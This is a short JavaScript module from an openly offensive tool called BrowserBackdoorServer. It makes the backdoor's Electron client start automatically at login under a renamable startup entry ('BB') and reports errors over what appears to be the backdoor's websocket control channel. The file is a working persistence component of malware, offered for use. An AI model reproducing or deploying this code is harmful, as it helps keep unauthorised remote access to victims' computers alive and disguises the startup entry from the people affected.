/*
 * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Enables startup of client application
 * Parameters: None
 * Returns: undefined, error
 * Author: IMcPwn
 */

electron = require('electron');

AutoLaunch = require('auto-launch');

appLauncher = new AutoLaunch({
    // Change this to the name of the application or what
    // should appear in the startup menu.
    name: 'BB'
});

appLauncher.isEnabled().then(function(enabled){
    if(enabled) return;
    return appLauncher.enable();
}).then(function(err){
    if (err !== undefined) ws.send(err)
});
